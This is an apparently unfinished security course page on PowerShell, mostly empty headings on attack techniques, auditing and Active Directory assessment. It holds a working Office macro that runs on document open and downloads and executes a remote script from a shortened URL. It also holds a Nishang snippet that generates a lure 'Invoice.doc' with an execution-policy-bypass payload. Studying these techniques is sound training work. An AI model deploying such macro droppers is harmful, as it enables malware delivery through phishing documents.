---
ref: cmap-powershell
title: CMAP Module 6 - Empowering the PowerShell
date: 2022-10-25T00:00:00+00:00
layout: page
lang: en
permalink: /en/powershell/
sitemap: false
---

> Work in Progress

## Hackers and Powerhell

### Basic Techniques

#### Encoded Commands

#### Running Scripts from Web

#### PowerShell Execution Policy

#### Constrained Language Mode

### Office Macros

#### PowerShell Autorun from Macro
```vbs
' Word Compatibility
Sub Auto_Open()
    Dim exec As String
    cmd = "powershell.exe ""Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://bit.ly/e0Mw9w'))"""
    Shell (cmd)
End Sub

' PowerPoint Compatibility
Sub AutoOpen()
    Auto_Open
End Sub

' Excel Compatibility
Sub Workbook_Open()
    Auto_Open
End Sub
```

#### Macro Document Generator
```powershell
# Import the Out-Word cmdlet from the Nishang module
IEX(IWR 'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-Word.ps1')
 
# Create payload
$payload = "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

# Generate a Word document
$path = Join-Path (Resolve-Path .) 'Invoice.doc'
Out-Word -Payload $payload -OutputFile $path -RemainSafe
```

### WMI Persistence

### Auditing PowerShell

#### Script Execution

#### Remoting Sessions

#### Microsoft Defender for Endpoint

## Active Directory Security Assessment

### Operating System Versions

### Kerberoasting

### DSInternals

### Event Logs


## Desired State Configuration

### Domain Controller Security Baselines


### CIS Checklists
## Pester

## Unattended Scripts

### Scheduled Tasks

### Managed Service Accounts

### Script Credentials

### Azure AD Credentials
